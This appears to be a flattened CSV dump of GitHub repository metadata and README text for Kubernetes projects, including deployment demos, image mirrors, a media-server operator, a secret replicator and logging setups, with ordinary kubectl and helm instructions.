be bound verifyfunctionality Congratulation Installation was hopefully successful,2020-12-20T12:16:31Z,2020-12-21T16:59:27Z,Shell,User,1,1,0,27,main,keeyzar,1,0,0,0,0,0,0
vocdoni,vocstack,,Vocstack Vocdoni stack deployment on docker and k8s Local docker compose To deploy a local development environment first you need to add the following to etc hosts 127 0 0 1 vocstack local Once ready you can run runlocalvocstack sh to checkout build and deploy all components from master branch If you want to use a diferent branch for a specific component you can do like following before running any script git submodule set branch branch release 0 5 external go dvote To undeploy cd to docker vocstacklocal and run docker compose down with v flag to delete volumes all data k8s To Do,2020-10-19T09:13:34Z,2020-12-03T09:55:15Z,Shell,Organization,4,1,0,16,main,vdo#elboletaire,2,0,0,0,0,0,0
ddzyan,myapp,,k8s source to images,2020-08-28T06:23:17Z,2020-09-18T03:54:37Z,JavaScript,User,1,1,0,7,master,ddzyan,1,0,0,0,0,0,0
zhangsean,k8s-autoscaling-mirror,,k8s autoscaling mirror Mirror of k8s gcr io autoscaling DockerHub Badge http dockeri co image zhangsean vpa recommender https hub docker com r zhangsean vpa recommender gcr io docker hub k8s gcr io autoscaling vpa updater 0 9 0 zhangsean vpa updater 0 9 0 https hub docker com r zhangsean vpa updater k8s gcr io autoscaling vpa recommender 0 9 0 zhangsean vpa recommender 0 9 0 https hub docker com r zhangsean vpa recommender k8s gcr io autoscaling vpa admission controller 0 9 0 zhangsean vpa admission controller 0 9 0 https hub docker com r zhangsean vpa admission controller Usage Prerequisites kubectl should be connected to the cluster you want to install VPA in The metrics server must be deployed in your cluster Read more about Metrics Server https github com kubernetes incubator metrics server If you already have another version of VPA installed in your cluster you have to tear down the existing installation first with sh hack vpa down sh Install sh Set env REGISTRY and TAG export REGISTRY zhangsean export TAG 0 9 0 Get autoscaling scripts git clone https github com kubernetes autoscaler git cd vertical pod autoscaler To print YAML contents with all resources that would be understood by kubectl diff apply commands you can use hack vpa process yamls sh print To install VPA hack vpa up sh Check if all system components are running kubectl namespace kube system get pods grep vpa The above command should list 3 pods recommender updater and admission controller all in state Running Check if the system components log any errors For each of the pods returned by the previous command do kubectl namespace kube system logs pod name grep e E 0 9 4 Check that the VPA Custom Resource Definition was created kubectl get customresourcedefinition grep verticalpodautoscalers Quick start A simple way to check if Vertical Pod Autoscaler is fully operational in your cluster is to create a sample deployment and a corresponding VPA config sh kubectl create f examples hamster yaml Example VPA configuration yaml apiVersion autoscaling k8s io v1 kind VerticalPodAutoscaler metadata name my app vpa spec targetRef apiVersion apps v1 kind Deployment name my app updatePolicy updateMode Auto To see VPA config and current recommended resource requests run sh kubectl describe vpa my app vpa Tear down Note that if you stop running VPA in your cluster the resource requests for the pods already modified by VPA will not change Tear down VPA components sh hack vpa down sh Goldilocks By using the kubernetes vertical pod autoscaler in recommendation mode we can see a suggestion for resource requests on each of our apps This tool creates a VPA for each deployment in a namespace and then queries them for information Installation sh helm repo add fairwinds stable https charts fairwinds com stable helm install goldilocks namespace kube system fairwinds stable goldilocks check pods status kubectl get po n kube system grep goldilocks Enable goldilocks VPA in namespace kube system kubectl label ns kube system goldilocks fairwinds com enabled true After that you will see VPA objects in that namespace kubectl get vpa n kube system Get VPA recommended for nginx ingress controller kubectl describe vpa n kube system nginx ingress controller Viewing the Dashboard The default installation creates a ClusterIP service for the dashboard You can access via ingress yaml apiVersion extensions v1beta1 kind Ingress metadata name goldilocks dashboard namespace kube system spec rules host goldilocks example com http paths backend serviceName goldilocks dashboard servicePort 8080 Then open your browser to http goldilocks example com Once your VPAs are in place you ll see recommendations appear in the Goldilocks dashboard Goldilocks Screenshot https github com FairwindsOps goldilocks blob master img screenshot png More info Vertical Pod Autoscaler https github com kubernetes autoscaler tree master vertical pod autoscaler Goldilocks https github com FairwindsOps goldilocks,2020-12-07T02:30:17Z,2020-12-08T03:08:30Z,Dockerfile,User,1,1,0,11,master,zhangsean,1,2,2,0,0,0,0
zaibon,dendrite-k8s-manifest,,K8S manifest for Dendrite Deploy a Dendrite https github com matrix org dendrite monolith server on a K8S cluster v1 16 Preparation 1 The manifest deploy dendrite into a namespace called dendrite First thing is to create the namspace shell kubectl create namespace dendrite 2 Generate the Dendrite server signing key Compile the generate keys tool from https github com matrix org dendrite tree master cmd generate keys and generate the server private key shell generate keys private key matrixkey pem 3 Create a secret from the private key generated in the previous step shell kubectl n dendrite create secret generic dendrite cert from file matrixkey pem 4 Configure your server name in the dendrite configuration file Edit the files dendrite cm yaml and dendrite cm yaml by replacing with your actual server name 5 Deploy dendrite shell kubectl apply f dendrite cm yaml dendrite deployment yaml dendrite pvc yaml dendrite svc yaml 6 Create an ingress to expose the server over your domain This ingress used cert manager https cert manager io to generate TLS certificate automatically from Lets Encrypt Make sure you have cert manager properly installed and functionning in your cluster before deploying the ingress Once cert manager is properly working and your domain point to one of your K8S node that has a public address deploy the ingress shell kubectl apply f dendrite ingress yaml 7 Configure the SRV record to configure the federation This example expect a SRV record properly configured in order to make the federation work Checkout the documentation to know how to configure it https matrix org docs spec serverserver latest resolving server names,2020-11-06T09:17:13Z,2020-12-19T11:59:50Z,n/a,User,0,1,0,5,main,zaibon,1,0,0,0,0,0,0
hellxz,cicd-demo,,cicd demo JenkinsKubernetes https www cnblogs com hellxz p easywayjenkinsintegrationk8s html Demo helloworldSpring BootMaven shellDocker Jenkins Dockerfile 1JenkinsJenkinsfile 2JenkinsMaven 3Shell Docker Image 4 Kubernetes 1 fork 2 Shell artifact2image sh deploy2k8s sh 3 JenkinsJenkinsfile,2020-12-23T06:12:20Z,2020-12-23T12:08:41Z,Shell,User,1,1,0,9,master,hellxz,1,0,0,0,0,0,0
paoloalba,deployer_k8s,,K8s deployer This repository implementes helpers for the programmatic deployment of K8s resources on a cluster The core of the logic is contained in the k8syamlobj py which implements classes for relevant YAML elements on K8s resources The generated YAML files can be then normally used through kubectl inline commands or within the desired script For examples of end uses please refer to https github com paoloalba devtfmodel https github com paoloalba tfapi https github com paoloalba imagesegmentationdistributed,2020-11-29T12:59:12Z,2020-12-02T20:02:23Z,Python,User,1,1,0,7,master,paoloalba,1,0,0,0,0,0,0
pradeep-misra,spark-k8s,,spark k8s This repo contains code and supporting files used to demo Spark Job on K8s using AWS EKS Tutorial Video https lnkd in gzu4UCn Input Data Sets and Time Series Tutorial https github com srivatsan88 End to End Time Series blob master MultipleTimeSeriesusingApacheSparkandProphet ipynb,2020-12-20T22:11:30Z,2020-12-21T12:43:08Z,Python,User,1,1,1,3,main,pradeep-misra,1,0,0,0,0,0,0
kubealex,k8s-mediaserver-operator,jackett#k8s#kubernetes#kubernetes-operator#linuxserver#mediaserver#operator#operator-sdk#plex#radarr#sonarr#transmission,k8s mediaserver operator Your all in one resource for your media needs I am so happy to announce the first release of the k8s mediaserver operator a project that mixes up some of the mainstream tools for your media needs The Custom Resource that is implemented allows you to create a fully working and complete media server on kubernetes based on Plex Media Server https www plex tv Plex Media Server A complete and fully funtional mediaserver that allows you to render in a webUI your movies TV Series podcasts video streams Sonarr https sonarr tv Sonarr A TV series and show tracker that allows the integration with download managers for searching and retrieving TV Series organizing them schedule notifications when an episode comes up and much more Radarr https radarr video Radarr The same a Sonarr but for movies Jackett https github com Jackett Jackett Jackett An API interface that keeps easy your life interacting with trackers for torrents Transmission https transmissionbt com Transmission A fast easy and reliable torrent client All the container images used by the operator are from linuxserver https github com linuxserver linuxserver io https www linuxserver io linuxserver io Introduction I started working on this project because I was tired of using the containerized version with docker podman compose and I wanted to experiment a bit both with helm and operators It is quite simple to use and very minimalistic with customizations that are strictly related to usability and access rather than complex customizations even if maybe in the future we could add it Each container has its init container in order to initialize configurations on the PV before starting the actual pod and avoid to restart the pods QuickStart The operator and the CR are already configured with some defaults settings to make you jump and go with it All you need is A namespace where you want to put your CR and all the pods that will spawn Being able to provision an RWX PV where to store configurations downloads and all related stuff suggested 200GB PV could be created manually and or dynamically provisioned First install the CRD and the operator kubectl apply f k8s mediaserver operator yml Then you are good to go with the CR kubectl apply f k8s mediaserver yml In seconds you will be ready to use your applications With default settings your applications will run in these paths http k8s mediaserver k8s test sonarr http k8s mediaserver k8s test radarr http k8s mediaserver k8s test transmission http k8s mediaserver k8s test jackett http k8s plex k8s test The mediaserver CR The CR is quite simple to configure and I tried to keep the number of parameters low to avoid confusion but still letting some customization to fit the resource inside your cluster General config Config path Meaning Default general ingresshost The hostname to use in ingress definition this will be the hostname where the applications will be exposed k8s mediaserver k8s test general plexingresshost The hostname to use for PLEX as it must be exposed on a dedicated path k8s plex k8s test general pgid The GID for the process 1000 general puid The UID for the process 1000 general nodeSelector Node Selector for all the pods general storage nfs Specifies if the PV should be configured as a NFS export false general storage nfsPath If PV type is NFS specifies the path of the export general storage nfsServer If PV type is NFS specifies the server exporting the volume general storage pvcName Name of the persistenVolumeClaim configured in deployments mediaserver pvc general storage pvcStorageClass Specifies a storageClass for the PVC general storage size Size of the persistenVolume 50Gi Plex Config path Meaning Default plex claim IMPORTANT Token from your account needed to claim the server CHANGEME plex replicaCount Number of replicas serving plex 1 plex container port The port in use by the container 32400 plex service type The kind of Service ClusterIP NodePort LoadBalancer ClusterIP plex service port The port assigned to the service 32400 plex service nodePort In case of service type NodePort the nodePort to use plex service extraLBService If true creates an additional LoadBalancer service with lb suffix requires a cloud provider or metalLB false plex ingress enabled If true creates the ingress resource for the application true plex ingress annotations Additional field for annotations if needed plex ingress path The path where the application is exposed plex plex ingress tls enabled If true tls is enabled false plex ingress tls secretName Name of the secret holding certificates for the secure ingress Sonarr Config path Meaning Default sonarr container port The port in use by the container 8989 sonarr service type The kind of Service ClusterIP NodePort LoadBalancer ClusterIP sonarr service port The port assigned to the service 8989 sonarr service nodePort In case of service type NodePort the nodePort to use sonarr service extraLBService If true creates an additional LoadBalancer service with lb suffix requires a cloud provider or metalLB false sonarr ingress enabled If true creates the ingress resource for the application true sonarr ingress annotations Additional field for annotations if needed sonarr ingress path The path where the application is exposed sonarr sonarr ingress tls enabled If true tls is enabled false sonarr ingress tls secretName Name of the secret holding certificates for the secure ingress Radarr Config path Meaning Default radarr container port The port in use by the container 7878 radarr service type The kind of Service ClusterIP NodePort LoadBalancer ClusterIP radarr service port The port assigned to the service 7878 radarr service nodePort In case of service type NodePort the nodePort to use radarr service extraLBService If true creates an additional LoadBalancer service with lb suffix requires a cloud provider or metalLB false radarr ingress enabled If true creates the ingress resource for the application true radarr ingress annotations Additional field for annotations if needed radarr ingress path The path where the application is exposed radarr radarr ingress tls enabled If true tls is enabled false radarr ingress tls secretName Name of the secret holding certificates for the secure ingress Jackett Config path Meaning Default jackett container port The port in use by the container 9117 jackett service type The kind of Service ClusterIP NodePort LoadBalancer ClusterIP jackett service port The port assigned to the service 9117 jackett service nodePort In case of service type NodePort the nodePort to use jackett service extraLBService If true it creates an additional LoadBalancer service with lb suffix requires a cloud provider or metalLB false jackett ingress enabled If true creates the ingress resource for the application true jackett ingress annotations Additional field for annotations if needed jackett ingress path The path where the application is exposed jackett jackett ingress tls enabled If true tls is enabled false jackett ingress tls secretName Name of the secret holding certificates for the secure ingress Transmission Config path Meaning Default transmission container port The port in use by the container 9091 transmission service type The kind of Service ClusterIP NodePort LoadBalancer ClusterIP transmission service port The port assigned to the service 9091 transmission service nodePort In case of service type NodePort the nodePort to use transmission service extraLBService If true creates an additional LoadBalancer service with lb suffix requires a cloud provider or metalLB false transmission ingress enabled If true creates the ingress resource for the application true transmission ingress annotations Additional field for annotations if needed transmission ingress path The path where the application is exposed transmission transmission ingress tls enabled If true tls is enabled false transmission ingress tls secretName Name of the secret holding certificates for the secure ingress About the project This project is intended as an exercise and absolutely for fun Don t use it to commit piracy Also feel free to contribute and extend it,2020-12-17T22:30:43Z,2020-12-27T17:15:03Z,Makefile,User,1,1,0,2,master,kubealex,1,0,0,0,0,0,0
hanwei-dev,k8s-install,,k8s install k8s,2020-08-21T01:17:59Z,2020-08-25T05:28:17Z,n/a,User,1,1,0,3,master,hanwei-dev,1,1,1,0,0,0,0
henryhcheung1,k8s_microservice,,Summary This repository holds my K8s development setup NFS dynamic provisioner Promtail Loki Grafana PLG stack Prometheus Prometheus operator Thanos Postgres Kafka Chaos Engineering Getting Started Set up n node K8s cluster Bash kind create cluster config kindconfig yaml k cluster info context kind kind NFS Bash vagrant up vagrant ssh nfs server Setup Promtail Loki Grafana monitoring stack via helm Bash helm upgrade install loki loki loki f helmlokivalues yaml n monitoring helm upgrade install promtail loki promtail f helmpromtailvalues yaml n monitoring helm upgrade install grafana grafana grafana f helmgrafanavalues yaml n monitoring should move these resources outside of cluster for monitoring cluster failure Prometheus Setup Bash k create configmap prometheus config from file prometheus yml n monitoring k create configmap prometheus config from file prometheus yml o yaml dry run k replace f Additional Notes Deprecated Setup nfs Start nfs docker container mounted to host directory Bash docker run network minikube itd privileged restart unless stopped e SHAREDDIRECTORY data v d data nfs storage data p 2049 2049 itsthenetwork nfs server alpine 12 From K8s worker nodes client mount NFS Bash mount t nfs 172 18 0 3 mnt,2020-11-28T18:30:22Z,2020-12-13T07:38:39Z,Shell,User,1,1,0,11,master,henryhcheung1,1,0,0,0,0,0,0
brito-rafa,k8s-mutators,,k8s mutators GO Module to Mutate k8s constructs See pkg directory,2020-12-25T17:49:26Z,2020-12-25T19:05:26Z,Go,User,1,1,0,3,main,brito-rafa,1,1,1,0,0,0,0
peppiii,fluent-bit,,Description Monitoring Logging fluent bit Kubernetes to ELK How to User please install kubectl in laptop or server clone repo git clone git github com peppiii fluent bit git use to folder cd fluent bit please read Noted in Readme before execute fluent bit Configmap namespaces logging FLUENTELASTICSEARCHHOST ip elasticsearh FLUENTELASTICSEARCHPORT port elasticsearch FLUENTELASTICSEARCHSCHEME schema by default http FLUENTELASTICSEARCHLOGSTASHPREFIX indexpattern in elasticsearch example example FLUENTELASTICSEARCHLOGSTASHINDEXNAME indexpattern in elasticsearch example example Secret FLUENTELASTICSEARCHUSER elastic FLUENTELASTICSEARCHPASSWORD please check in elasticsearch How To Secret To create the Secret containing the FLUENTELASTICSEARCHUSER choose a user and convert it to base64 echo n KubernetesRocks base64 S3ViZXJuZXRlc1JvY2tzIQ To create the Secret containing the FLUENTELASTICSEARCHPASSWORD choose a password and convert it to base64 echo n apajaboleh base64 S3ViZXJuZXRlc1JvY2tzIQ please insert to fluent bit secret yml Step Apply kubectl apply f fluent acl yml kubectl apply f fluent bit configmap yml kubectl apply f fluent bit secret yml kubectl apply f fluent bit daemonset yml License Commercial use,2020-10-30T04:06:10Z,2020-11-06T16:41:04Z,n/a,User,1,1,0,0,master,,0,0,0,0,0,0,0
zhangsean,k8s-descheduler-mirror,,k8s descheduler mirror Mirror of k8s gcr io descheduler descheduler gcr io docker hub k8s gcr io descheduler descheduler v0 20 0 zhangsean descheduler v0 20 0 https hub docker com r zhangsean descheduler Usage sh Deploy using helm helm repo add descheduler https kubernetes sigs github io descheduler helm install descheduler namespace kube system set image repository zhangsean descheduler set schedule 10 descheduler descheduler helm chart Deploy using yaml Run As A CronJob kubectl create f https github com kubernetes sigs descheduler raw master kubernetes base rbac yaml kubectl create f https github com kubernetes sigs descheduler raw master kubernetes base configmap yaml curl sSL https github com kubernetes sigs descheduler raw master kubernetes cronjob cronjob yaml sed s k8s gcr io descheduler zhangsean g kubectl create f Set the cron schedule to run the descheduler job on 10 curl sSL https github com kubernetes sigs descheduler raw master kubernetes cronjob cronjob yaml sed s k8s gcr io descheduler zhangsean gs 2 10 g kubectl create f More info kubernetes sigs descheduler https github com kubernetes sigs descheduler,2020-11-12T01:03:53Z,2020-12-25T07:27:02Z,Dockerfile,User,1,1,0,8,master,zhangsean,1,3,3,0,0,0,0
djbotha,docker-k8s,,,2020-10-26T20:51:40Z,2020-11-03T11:58:24Z,JavaScript,User,1,1,0,4,master,djbotha,1,0,0,0,0,0,0
fromanirh,tmpolx,,TMPolX Topology Manager Policy eXploration tool A simple tool to test how kubernetes topology manager behave without need to run the real workload This tool uses the very same packages from upstream kubernetes to give the closest representation as possible as the real thing Usage example bash tmpolx N 0 1 P restricted nvidia com gpu 01 true 11 false openshift io intelsriov 10 true 11 false cpu 01 true 10 true 11 false using policy restricted resource hints nvidia com gpu 01 true 11 false openshift io intelsriov 10 true 11 false cpu 01 true 10 true 11 false admit false hint 01 false tmpolx J N 0 1 P restricted R cpu H M 01 P true M 10 P true M 11 P false R nvidia com gpu H M 01 P true M 11 P false R openshift io intelsriov H M 10 P true M 11 P false using policy restricted resource hints nvidia com gpu 01 true 11 false openshift io intelsriov 10 true 11 false cpu 01 true 10 true 11 false admit false hint 01 false Command line explanation tmpolx expects to receive positional arguments which represent the topology manager hints json R something resource name H array of hints M 1111 bitmask P true preferred flag tmpolx accepts topology manager hints both in native go format just copy paste them from the kubelet logs or in JSON format The go format is handier and simpler to use but the support is still experimental The JSON format is recommended to get the maximum safety The default is to use the go format Topology Hints in JSON format Use the J flag to enable this format bash cpu 01 true 10 true 11 false is resource cpu hints 01 true 10 true 11 false each hint is mask preferred so we get json R cpu H M 01 P true M 10 P true M 11 P false license C 2020 Red Hat Inc and licensed under the Apache License v2 build just run bash make,2020-11-26T11:17:44Z,2020-11-27T15:37:37Z,Go,User,1,1,0,11,main,fromanirh,1,2,2,0,0,0,0
GOFamily,hi-container,docker#docker-compose#docker-image#go#gofamily#golang#google#k8s#kubernetes,hi container,2020-12-17T17:09:46Z,2020-12-19T03:48:08Z,n/a,Organization,0,1,1,1,main,shgopher,1,0,0,0,0,0,0
nareshsaw5,multi-k8s,,multi k8s An multi pod K8S application,2020-10-23T17:35:06Z,2020-10-25T17:41:09Z,JavaScript,User,1,1,0,1,master,nareshsaw5,1,0,0,0,0,0,0
olli-ai,k8s-replicator,,ConfigMaps and secrets replication for Kubernetes k8s replicator is a stateless controller used to replicate configMaps and secrets to make them available in multiple namespaces or to create persistent configMaps and secrets that won t be cleared by the next helm release This controller is designed to solve those problems Secrets and configMaps are only available in a specific namespace and there is no easy way to make a configMap or secret available across the whole cluster Helm releases systematically replace all the objects and don t allow any persistent values across successive releases which is especially problematic for randomly generated passwords Deployment From helm repository shellsession helm repo add olli ai https olli ai github io helm charts helm upgrade install k8s replicator olli ai k8s replicator Using Helm shellsession helm upgrade install k8s replicator deploy helm chart k8s replicator Manual shellsession Create roles and service accounts kubectl apply f https raw githubusercontent com olli ai k8s replicator master deploy rbac yaml Create actual deployment kubectl apply f https raw githubusercontent com olli ai k8s replicator master deploy deployment yaml Usage Receiving a copy of secret or configMap You can configure a secret or a configMap to receive a copy of another secret or configMap yaml apiVersion v1 kind ConfigMap metadata annotations k8s replicator replicate from default some secret data Annotations are k8s replicator replicate from The source of the data to receive a copy from Can be a full path or just a name if the source is in the same namespace k8s replicator replicate once Set it to true for being replicated only once no matter to the future changes of the source Can be useful if the source is a randomly generated password but you don t want your local password to change anymore Unless you run k8s replicator with the allow all flag you need to explicitely allow the source to be replicated yaml apiVersion v1 kind ConfigMap metadata annotations k8s replicator replication allowed true data At leat one of the two annotations is required if allow all is not used k8s replicator replication allowed Set it to true to explicitely allow replication or false to explicitely diswallow it k8s replicator replication allowed namespaces a comma separated list of namespaces or namespace patterns to explicitely allow ex my namespace test namespace 0 9 Other annotations are k8s replicator replicate once Set it to true for being replicated only once no matter future changes Can be useful if the secret is a randomly generated password but you don t want the local copies to change anymore k8s replicator replicate once version When a different version is set this secret or confingMap is replicated again even if replicated once It allows a thinner control on the k8s replicator replicate once annotation Can be any string The content of the target secret of configMap will be cleared if the source does not exist does not allow replication or is deleted Replicating a secret or configMap to other locations You can configure a secret or a configMap to replicate itself automatically to desired locations yaml apiVersion v1 kind ConfigMap metadata annotations k8s replicator replicate to default other secret data At leat one of the two annotations is required k8s replicator replicate to The target s of the annotation comma separated Can be a name a full path or a pattern If just given a name it will be combined with the namespace of the source or with the k8s replicator replicate to namespaces annotation if present ex other secret other namespace another secret test namespace 0 9 nyan secret k8s replicator replicate to namespaces The target namespace s and namespace pattern s for replication comma separated it will be combined with the name of the source or with the k8s replicator replicate to if present ex other namespace test namespace 0 9 Other annotations are k8s replicator replicate once Set it to true for being replicated only once no matter future changes Can be useful if the secret is a password randomly generated by helm and you want stable copy that won t change on future helm releases k8s replicator replicate once version When a different version is set this secret or confingMap is replicated again even if replicated once It allows a thinner control on the k8s replicator replicate once annotation Can be any string The labels given to any created target secret or configMap can be configured with the create with labels Replication will be cancelled if the target secret or configMap already exists but was not created by replication from this source However as soon as that existing target is deleted it will be replaced by a replication of the source As soon as any target namespace is created required target secrets and configMaps are created Once the source secret or configMap is deleted or its annotations are changed the target is deleted Combining both k8s replicator replicate from and k8s replicator replicate to annotations can be combined together in order to replicate the data of another secret or configMap to a specified target It can combine both sets of annotations and will create a target secret or configMap that acts according to its k8s replicator replicate from annotations This is especially useful because the generated secret or configMap is not managed by helm and won t be erased by helm releases thus avoiding the secret or configMap to be shortly reset at each release which may trigger the pods to restart if a reloader https github com stakater Reloader is used The generated secret or configMap is deleted if its creator is deleted and cleared if its source is deleted or does not allow replication Handling errors The state of the replicated secrets and configMaps and is stored in their annotations so k8s replicator is resilient to restarts and kubernetes errors and won t perform redundant actions resync period configures how often the list of resources is reloaded which forces the replicator to check the state of the cluster All updates creations deletions are performed against the ResourceVersion so any outdated update will fail If any annotation is detected to be illformed no action will be performed This is also the case if an unknown annotation with the same prefix is detected unless ignore unknown option is passed This ensures that no unintended action is performed because of a human error avoiding to unintentionally delete or clear a secret or configMap The logs of the k8s replicator pod will show the full history of actions and explanations why some of these actions are cancelled Examples Import database credentials anywhere Create the source secret yaml apiVersion v1 kind Secret type Opaque metadata name database credentials namespace default annotations k8s replicator replication allowed true stringData host mydb com database mydb password qwerty You can now create an empty secret everywhere you needs this including in helm charts yaml apiVersion v1 kind Secret type Opaque metadata name local database credentials annotations k8s replicator replicate from default database credentials Or you can give your secret a target such that it won t be reset by helm on further helm releases yaml apiVersion v1 kind Secret type Opaque metadata name source database credentials annotations k8s replicator replicate from default database credentials k8s replicator replicate to target database credentials Use random password generated by an helm chart Create your source secret with a random password and replicate it once yaml apiVersion v1 kind Secret type Opaque metadata name admin password source annotations k8s replicator replicate to admin password k8s replicator replicate once true stringData password randAlphaNum 64 quote And use it in your deployment yaml apiVersion extensions v1beta1 kind Deployment spec template spec containers name my container image gcr io my project my container latest env name ADMINPASSWORD valueFrom secretKeyRef name admin password key password Spread your TLS key Create your TLS secret yaml apiVersion v1 kind Secret type kubernetes io tls metadata name tls example com namespace jx annotations k8s replicator replicate to namespaces jx stringData tls crt BEGIN CERTIFICATE END CERTIFICATE tls key BEGIN RSA PRIVATE KEY END RSA PRIVATE KEY And use it in your ingresses in any namespace you replicated to yaml apiVersion networking k8s io v1beta1 kind Ingress metadata name my ingress namespace jx production spec tls hosts subdomain example com secretName tls example com Configurable secret for helm charts Allow different possible configuration in your values yaml yaml admin source another secret as admin login password login admin the admin login if no secret provided password the admin password randomly generated if not provided version 0 increase this if the format changes Now a template secret admin yaml can be configured yaml apiVersion v1 kind Secret type Opaque metadata name my app admin source annotations k8s replicator replicate to my app admin if Values admin source k8s replicator replicate from Values admin source else if not Values admin password k8s replicator replicate once true k8s replicator replicate once version v Values admin version login Values admin login end if not Values admin source stringData login Values admin login if Values admin password password Values admin password quote else password randAlphaNum 64 quote end end This way the source of the secret external secret helm value or random can be easily configured the secret won t be erased by future helm releases and the random password won t change unless the login changes Configuration Helm parameter Argument Description Default allowAll allow all Implicitly allow to copy from any secret or configMap false ignoreUnknown ignore unknown Unknown annotations with the same prefix do not raise an error false resyncPeriod resync period How often the kubernetes informers should resynchronize 30m runReplicators run replicators The replicators to run all or a comma separated list of case insensitive replicators secret configMap all annotationsPrefix annotations prefix The prefix to use on every annotations k8s replicator createWithLabels create with labels A comma separated list of labels and values to apply to created secrets and configMaps label1 value1 label2 value2 app kubernetes io managed by Values annotationsPrefix nameOverride Overrides the name used in the label selector and the default name of the resources Chart Name fullnameOverride Overrides the name of the resources Release Name Values nameOverride status address The address for the status HTTP endpoint 9102 kube config The path to Kubernetes config file cluster config Replicating more resources k8s replicator can easily be extended to replicate any resource in kubernetes golang package mypackage import log time github com olli ai k8s replicator replicate metav1 k8s io apimachinery pkg apis meta v1 k8s io apimachinery pkg runtime k8s io client go kubernetes k8s io client go tools cache var myActions myActions myActions func NewMyReplicator client kubernetes Interface options replicate ReplicatorOptions resyncPeriod time Duration replicate Replicator repl replicate ObjectReplicator ReplicatorProps replicate NewReplicatorProps client myResource options ReplicatorActions myActions myResurces MyResources client listWatch cache ListWatch ListFunc func lo metav1 ListOptions runtime Object error return myResurces List lo WatchFunc myResurces Watch repl InitStores listWatch MyResource resyncPeriod return repl type myActions struct func myActions GetMeta object interface metav1 ObjectMeta return object MyResources ObjectMeta func myActions Update client kubernetes Interface object interface sourceObject interface annotations map string string interface error mySource sourceObject MyResource myObject object MyResource DeepCopy myObject Annotations annotations TODO copy the data from mySource to myObject log Printf updating myResource s s myObject Namespace myObject Name update err MyResources client myObject Namespace Update myObject if err nil log Printf error while updating myResource s s s myObject Namespace myObject Name err return update err func myActions Clear client kubernetes Interface object interface annotations map string string interface error myObject object MyResource DeepCopy myObject Annotations annotations TODO clear the data from myObject log Printf clearing myResource s s myObject Namespace myObject Name update err MyResources client myObject Namespace Update myObject if err nil log Printf error while clearing myResource s s myObject Namespace myObject Name return update err func myActions Install client kubernetes Interface meta metav1 ObjectMeta sourceObject interface dataObject interface interface error mySource sourceObject MyResource myObject MyResource TypeMeta mySource TypeMeta ObjectMeta meta TODO copy other meta fields from mySource to myObject if dataObject nil myData dataObject MyResource TODO copy the data from myData to myObject log Printf installing myResource s s myObject Namespace myObject Name var update MyResource var err error if myObject ResourceVersion update err MyResources client myObject Namespace Create myObject else update err MyResources client myObject Namespace Update myObject if err nil log Printf error while installing myResource s s s myObject Namespace myObject Name err return update err func myActions Delete client kubernetes Interface object interface error myObject object MyResource log Printf deleting myResource s s myObject Namespace myObject Name options metav1 DeleteOptions Preconditions metav1 Preconditions ResourceVersion myObject ResourceVersion err MyResources client myObject Namespace Delete myObject Name options if err nil log Printf error while deleting myResource s s s myObject Namespace myObject Name err return err And add the replicator function in main go golang var newReplicatorFuncs map string newReplicatorFunc map string newReplicatorFunc configmap replicate NewConfigMapReplicator secret replicate NewSecretReplicator myResource mypackage NewMyReplicator,2020-10-20T04:42:32Z,2020-11-05T08:07:54Z,Go,Organization,0,1,0,194,master,aure-olli#martin-helmich#Hermsi1337#devops-olli#narayanan#desaintmartin#jamessthompson#willholley#ajp-lqx,9,0,2,0,0,0,0
yxzhm,k8s-demo,,K8S Demo This demo shows how to deploy a simple micro service into k8s cluster We need to create a k8s cluster firstly In this demo I just use the aks Azure K8S service directly Prerequisite Install the kubectl and helm cli tools You also need to get the k8s certification firstly For aks you can use Azure cli tool to get it Use kubectl config view to check the k8s certification Install the httpbin Firstly we want to deploy the httpbin into k8s The steps are as following Create a namespace called demo kubectl create namespace demo Install the httpbin app kubectl n demo create f 1demok8syaml httpbin yaml Install the busy to check the httpbin works kubectl n demo create f 1demok8syaml busybox yaml kubectl n demo exec it busybox sh curl httpbin get args headers Accept Host httpbin User Agent curl 7 30 0 origin 10 244 0 30 url http httpbin get Install Ambassador as API Gateway kubectl create ns ambassador cd 2demohelm ambassador helm namespace ambassador install api gateway Install the httpbin using helm helm namespace demo install httpbin Install the auth app helm namespace demo install auth Use busybox to check curl i auth 8080 the auth app Once the auth installed successfully You need add the Authorization Bearer 12345678 header to get the correct response,2020-08-23T17:40:27Z,2020-09-27T09:50:33Z,Smarty,User,1,1,0,1,master,yxzhm,1,0,0,0,0,0,0
LayMui,k8s-demo,,Steps 0 To create a cluster minikube start vm driver hyperkit 1 kubectl apply f mongo secret yaml 2 kubectl get secret NAME TYPE DATA AGE default token prpr6 kubernetes io service account token 3 3h44m mongodb secret Opaque 2 8s 3 kubectl apply f mongodb deployment yaml 4 kubectl get all 5 kubectl get pod kubectl get pod watch kubectl describe pod 6 kubectl get pod NAME READY STATUS RESTARTS AGE mongodb deployment 8f6675bc5 5k5dl 1 1 Running 0 3m4s Create an internal service Allow you to put multiple documents in 1 file denote separation of documents Put Deployment Service in 1 file because they belong together kubectl apply f mongodb deployment yaml kubectl get service NAME TYPE CLUSTER IP EXTERNAL IP PORT S AGE kubernetes ClusterIP 10 96 0 1 443 TCP 4h14m mongodb service ClusterIP 10 97 167 20 27017 TCP 11s kubectl describe service mongodb service Name mongodb service Namespace default Labels Annotations kubectl kubernetes io last applied configuration apiVersion v1 kind Service metadata annotations name mongodb service namespace default spec ports port Selector app mongodb Type ClusterIP IP 10 97 167 20 Port 27017 TCP TargetPort 27017 TCP Endpoints 172 17 0 4 27017 Session Affinity None Events IP address of the Pod 172 17 0 4 and port is 27017 where the app is listening to kubectl get pod o wide kubectl get all to show ALL components kubectl get all grep mongodb to filter by monddb Need to tell mongoexpress which database to connect MongoDB Address Internal Service which credentials to authenticate kubectl apply f mongo configmap yaml kubectl apply f mongoexpress deployment yaml kubectl get pod kubectl logs mongo express 78fcf796b8 9glzp Waiting for mongodb service 27017 Welcome to mongo express Mongo Express server listening at http 0 0 0 0 8081 Server is open to allow connections from anyone 0 0 0 0 basicAuth credentials are admin pass it is recommended you change this in your config js Database connected Admin Database connected To access mongo express from a browser we need a external service Add the service to the mongoexpress deployment yaml How to make it an External Service type LoadBalancer assigns service an external IP address and so accepts external requests nodePort Port where the external IP address will be opened It is the Port you put in the browser to access this service must be between 30000 32767 kubectl get service NAME TYPE CLUSTER IP EXTERNAL IP PORT S AGE kubernetes ClusterIP 10 96 0 1 443 TCP 7h32m mongo express service LoadBalancer 10 96 62 211 8081 30000 TCP 7m9s mongodb service ClusterIP 10 97 167 20 27017 TCP 3h18m Internal Service or Cluster IP is DEFAULT Cluster IP will give the service an internal 